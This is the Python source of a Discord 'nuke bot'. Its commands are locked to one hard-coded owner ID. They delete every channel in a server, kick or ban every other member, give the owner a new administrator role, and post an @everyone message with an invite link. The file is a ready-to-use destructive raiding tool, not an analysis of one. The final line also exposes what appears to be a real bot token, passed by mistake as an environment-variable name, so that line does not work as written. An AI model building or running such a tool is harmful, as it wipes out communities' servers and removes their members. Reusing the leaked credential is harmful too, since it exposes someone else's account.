import os 
import discord
from discord.ext import commands

client = commands.Bot(command_prefix=commands.when_mentioned_or("d/", "D/"),  help_command=None)

@client.event
async def on_ready():
  print('Nuke Bot Is Ready to go!')

owner = 897575515114852372

@client.command()
async def abomb(ctx):

  if ctx.author.id == owner:

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("@everyone\nKABOOOM\n")

  else:
    await ctx.send("No Lmao")


@client.command()
async def bbomb(ctx):

  if ctx.author.id == owner:


    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.kick()
                await ctx.send(f"Successfully kicked {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to kick {member} {e}")
  else:
    await ctx.send("No")

@client.command()
async def cbomb(ctx):

  if ctx.author.id == owner:

    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.ban()
                await ctx.send(f"Successfully ban {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")
  else:
    await ctx.send("No")

@client.command()
async def dbomb(ctx):

  if ctx.author.id == owner:

    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name=".", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()
  else:
    await ctx.send("No")

@client.command()
async def e(ctx):

  if ctx.author.id == owner:

    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.ban()
                await ctx.send(f"Successfully ban {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")
    
    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("KABOOOM\ndiscord.gg/VMXyEHtMPj")
  else:
    await ctx.send("No")


client.run(os.getenv('ODk3NTc3NzAzMjcwNjc0NDkz.YWXsYA.iHc2Gqr81rNtYwKHjxLTW-cwTfQ'))

